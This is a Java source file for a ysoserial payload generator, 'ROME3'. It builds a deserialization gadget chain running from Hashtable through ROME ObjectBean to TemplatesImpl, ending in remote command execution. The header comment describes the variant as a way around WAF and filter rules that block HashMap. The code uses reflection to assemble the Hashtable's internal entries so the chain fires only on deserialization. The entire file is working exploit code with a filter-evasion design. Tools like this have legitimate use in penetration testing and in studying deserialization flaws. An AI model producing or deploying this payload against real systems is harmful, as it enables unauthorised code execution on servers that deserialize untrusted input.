package ysoserial.payloads;

import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.util.Hashtable;

import javax.xml.transform.Templates;

import com.sun.syndication.feed.impl.ObjectBean;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	ROME variant using Hashtable as entry point.
	Bypasses WAF/filter rules that block HashMap but allow Hashtable.

	Gadget chain:
		ObjectInputStream.readObject()
			Hashtable.readObject()
				Hashtable.reconstitutionPut()
					ObjectBean.hashCode()
						EqualsBean.beanHashCode()
							ToStringBean.toString()
								BeanIntrospector iterates getters
									TemplatesImpl.getOutputProperties()
										TemplatesImpl.newTransformer()
											defineTransletClasses() → RCE

	Differs from ROME:
		- Entry: Hashtable (not HashMap)
		- Bypasses filters on HashMap, HashSet

	Construction trick:
		Hashtable.put() also calls hashCode() — would trigger chain prematurely.
		Instead, construct Hashtable's internal Entry table directly via reflection,
		bypassing put(). On deserialization, reconstitutionPut() calls hashCode().

	Requires:
		rome 1.0
 */

@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies("rome:rome:1.0")
@Authors({ Authors.MBECHLER })
public class ROME3 extends PayloadRunner implements ObjectPayload<Hashtable> {

	public Hashtable getObject(final String command) throws Exception {
		final Object tpl = Gadgets.createTemplatesImpl(command);
		final ObjectBean delegate = new ObjectBean(Templates.class, tpl);
		final ObjectBean root = new ObjectBean(ObjectBean.class, delegate);

		// Build Hashtable manually to avoid calling hashCode() during put()
		final Hashtable ht = new Hashtable();
		Reflections.setFieldValue(ht, "count", 1);

		// Construct internal Hashtable$Entry directly
		final Class<?> entryClass = Class.forName("java.util.Hashtable$Entry");
		final Constructor<?> entryCons = entryClass.getDeclaredConstructor(
			int.class, Object.class, Object.class, entryClass);
		Reflections.setAccessible(entryCons);

		// Entry(hash=0, key=root, value="x", next=null)
		// hash value doesn't matter — readObject() recomputes it from key.hashCode()
		final Object entry = entryCons.newInstance(0, root, "x", null);

		// Default Hashtable capacity is 11
		final Object[] table = (Object[]) Array.newInstance(entryClass, 11);
		table[0] = entry;
		Reflections.setFieldValue(ht, "table", table);
		Reflections.setFieldValue(ht, "threshold", 8);

		return ht;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(ROME3.class, args);
	}
}
